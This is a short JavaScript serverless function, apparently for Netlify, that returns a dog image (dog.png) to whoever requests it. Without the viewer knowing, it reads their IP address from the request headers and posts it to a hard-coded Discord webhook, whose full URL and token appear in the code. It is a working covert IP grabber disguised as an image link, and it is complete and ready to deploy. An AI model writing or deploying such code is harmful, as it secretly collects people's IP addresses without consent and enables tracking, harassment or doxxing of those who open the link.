const fetch = require("node-fetch");
const fs = require("fs");
const path = require("path");

const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1384059457054572564/-d1jkEYCaQjbBga4Unbalu8AKOc7OsYYK6__vGUHGuheXBeTZE2_1uPp3YLDEaaf42z6";

exports.handler = async function(event) {
  // Get visitor IP
  const ip =
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"] ||
    event.headers["x-nf-client-connection-ip"] ||
    "unknown";

  // Send IP to Discord webhook
  await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `Dog.png viewed by IP: ${ip}` }),
  });

  // Read dog.png from repo root
  const imagePath = path.resolve(__dirname, "dog.png");
  const imageBuffer = fs.readFileSync(imagePath);

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "image/png",
      "Cache-Control": "no-cache",
    },
    body: imageBuffer.toString("base64"),
    isBase64Encoded: true,
  };
};
